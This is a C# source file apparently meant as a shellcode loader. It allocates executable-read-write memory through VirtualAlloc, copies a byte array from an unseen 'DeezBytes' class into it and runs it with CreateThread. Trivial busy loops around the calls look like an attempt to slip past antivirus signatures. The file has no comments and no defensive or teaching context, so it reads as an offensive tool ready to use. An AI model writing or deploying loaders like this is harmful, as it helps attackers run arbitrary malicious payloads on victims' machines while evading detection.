using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Runtime.InteropServices;

namespace Custom
{
    class Program
    {
        static void Main(string[] args)
        {
            DeezBytes b = new DeezBytes();
            UInt32 fa = VirtualAlloc(0, (UInt32)b.Bytes.Length,
                                0x1000, 0x40);
            Marshal.Copy(b.Bytes, 0, (IntPtr)(fa), b.Bytes.Length);
            IntPtr ht = IntPtr.Zero;
            UInt32 threadId = 0;

            int i = 0;
            do
            {
                i++;
            } while (i < 100);

            IntPtr pinfo = IntPtr.Zero;
            ht = CreateThread(0, 0, fa, pinfo, 0, ref threadId);

            int j = 0;
            do
            {
                j++;
            } while (j < 42);

            WaitForSingleObject(ht, 0xFFFFFFFF);
        }

        [DllImport("kernel32")]
        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
             UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

        [DllImport("kernel32")]
        private static extern bool VirtualFree(IntPtr lpAddress,
                              UInt32 dwSize, UInt32 dwFreeType);

        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(

          UInt32 lpThreadAttributes,
          UInt32 dwStackSize,
          UInt32 lpStartAddress,
          IntPtr param,
          UInt32 dwCreationFlags,
          ref UInt32 lpThreadId

          );

        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(

          IntPtr hHandle,
          UInt32 dwMilliseconds
          );

    }
}
